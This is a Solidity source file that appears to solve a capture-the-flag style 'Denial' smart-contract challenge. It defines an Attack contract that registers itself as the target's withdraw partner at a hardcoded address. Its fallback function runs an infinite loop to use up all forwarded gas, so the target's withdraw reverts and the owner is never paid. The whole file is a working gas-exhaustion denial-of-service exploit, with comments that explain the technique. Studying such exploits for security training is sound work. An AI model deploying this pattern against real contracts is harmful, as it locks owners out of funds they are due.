//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IDenial{
    function setWithdrawPartner(address) external;
    function withdraw() external;
}

contract Attack{

IDenial target = IDenial(0x5487E4852E37AF29C0F739141D54A717CAE64404);

function attack() public {

    //set this contract as partner
    target.setWithdrawPartner(address(this));

    //target.withdraw();

}

//the fallback() will be triggered when the .call{}() inside the target will execute
//I had to write the fallback() in such a way that it consumes all the gas the Denial contract forwards
// making the withdraw() revert and never execute the transfer to the owner
fallback() external payable{

    //an infinite loop that reads a value from the blockchain
    //its a fast way to drain the contract of all gas
    while(true){ uint x = block.number; }
}

}
